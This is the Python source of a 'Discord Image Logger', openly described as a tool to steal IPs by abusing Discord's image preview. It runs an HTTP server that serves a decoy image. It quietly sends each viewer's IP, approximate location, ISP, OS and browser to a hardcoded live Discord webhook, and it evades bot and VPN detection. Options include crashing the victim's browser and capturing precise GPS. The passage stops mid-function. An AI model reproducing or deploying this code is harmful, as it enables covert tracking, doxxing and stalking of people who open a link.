# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1335273276121026600/ro4wCzsz111keEA4udbmjpywQXDDH4Ec_gMANXkR3cfnv3phds704aHiq72XdhP5MzBj",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
